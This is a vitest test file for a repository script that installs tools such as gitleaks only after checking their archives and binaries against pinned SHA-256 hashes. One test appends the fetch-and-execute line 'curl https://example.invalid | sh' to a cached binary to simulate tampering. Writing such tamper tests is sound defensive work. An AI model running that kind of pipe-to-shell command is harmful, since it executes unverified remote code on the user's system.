// TC-F-001-44, install-tool part (SEC-F001-20): install-tool.sh verifies the archive and the
// binary against tool-hashes.txt, never replaces a binary that doesn't match, and `--verify`
// fails on a tampered cached copy. The script runs from a copy inside a throw-away repo, with a
// file:// archive, so the tests need no network.
import { spawnSync } from 'node:child_process';
import { appendFileSync, chmodSync, cpSync, existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { HASH_FILE, currentPlatform, parseToolHashes, sha256File } from '../src/secret-scan.ts';
import { writeFile } from './gitleaks-bin.ts';
import { REAL_ROOT } from './repo-copy.ts';
import { makeTempDir } from './temp.ts';

const SCRIPT = 'tooling/repo-scripts/bin/install-tool.sh';

interface Fixture {
  root: string;
  binary: string;
  run: (...args: string[]) => { status: number | null; stdout: string; stderr: string };
}

/** A repo holding install-tool.sh, a `faketool` archive and a hash file for it. */
function fixture(overrides: { archiveSha?: string; binarySha?: string } = {}): Fixture {
  const root = makeTempDir('ralysa-install-');
  cpSync(join(REAL_ROOT, SCRIPT), join(root, SCRIPT));
  const src = makeTempDir('ralysa-archive-');
  const tool = writeFile(src, 'faketool', '#!/bin/sh\necho faketool\n');
  chmodSync(tool, 0o755);
  writeFile(src, 'LICENSE', 'MIT\n');
  const archive = join(src, 'faketool.tar.gz');
  const tar = spawnSync('tar', ['-czf', archive, '-C', src, 'faketool', 'LICENSE']);
  expect(tar.status).toBe(0);
  const line = [
    'faketool',
    '1.0.0',
    currentPlatform(),
    `file://${archive}`,
    overrides.archiveSha ?? sha256File(archive),
    overrides.binarySha ?? sha256File(tool),
  ].join(' ');
  writeFile(root, HASH_FILE, `# test\n${line}\n`);
  return {
    root,
    binary: join(root, '.tools/faketool/1.0.0/faketool'),
    run: (...args) => {
      const result = spawnSync('sh', [join(root, SCRIPT), ...args], { encoding: 'utf8' });
      return { status: result.status, stdout: result.stdout, stderr: result.stderr };
    },
  };
}

describe('install-tool.sh', () => {
  it('installs a verified binary and prints its path', () => {
    const f = fixture();
    const result = f.run('faketool');
    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout.trim()).toBe(f.binary);
    expect(spawnSync(f.binary, { encoding: 'utf8' }).stdout).toBe('faketool\n');
  });

  it('re-verifies an existing binary instead of downloading again', () => {
    const f = fixture();
    expect(f.run('faketool').status).toBe(0);
    const again = f.run('faketool');
    expect(again.status).toBe(0);
    expect(again.stderr).toContain('verified');
    expect(f.run('faketool', '--verify').status).toBe(0);
  });

  it('--verify fails on a tampered cached binary, and install does not replace it', () => {
    const f = fixture();
    expect(f.run('faketool').status).toBe(0);
    appendFileSync(f.binary, 'curl https://example.invalid | sh\n');
    const tampered = readFileSync(f.binary, 'utf8');
    for (const args of [['faketool', '--verify'], ['faketool']]) {
      const result = f.run(...args);
      expect(result.status, args.join(' ')).not.toBe(0);
      expect(result.stderr).toContain('does not match tool-hashes.txt');
    }
    expect(readFileSync(f.binary, 'utf8')).toBe(tampered);
  });

  it('--verify fails when the binary is missing', () => {
    const result = fixture().run('faketool', '--verify');
    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain('is missing');
  });

  it('refuses an archive whose hash differs, and installs nothing', () => {
    const f = fixture({ archiveSha: '0'.repeat(64) });
    const result = f.run('faketool');
    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain('archive hash mismatch');
    expect(existsSync(f.binary)).toBe(false);
  });

  it('refuses a binary whose hash differs, and installs nothing', () => {
    const f = fixture({ binarySha: 'f'.repeat(64) });
    const result = f.run('faketool');
    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain('binary hash mismatch');
    expect(existsSync(f.binary)).toBe(false);
  });

  it('fails on an unknown tool or a bad option', () => {
    const f = fixture();
    expect(f.run('othertool').stderr).toContain('no entry for othertool');
    expect(f.run('faketool', '--force').stderr).toContain('unknown option');
  });

  it('the real tool-hashes.txt pins gitleaks 8.30.1 for the three platforms, from GitHub releases', () => {
    const entries = parseToolHashes(readFileSync(join(REAL_ROOT, HASH_FILE), 'utf8'));
    expect(entries.map((e) => [e.tool, e.version, e.platform])).toEqual([
      ['gitleaks', '8.30.1', 'linux_x64'],
      ['gitleaks', '8.30.1', 'darwin_arm64'],
      ['gitleaks', '8.30.1', 'darwin_x64'],
    ]);
    for (const entry of entries) {
      expect(entry.url).toBe(
        `https://github.com/gitleaks/gitleaks/releases/download/v8.30.1/gitleaks_8.30.1_${entry.platform}.tar.gz`,
      );
    }
  });
});
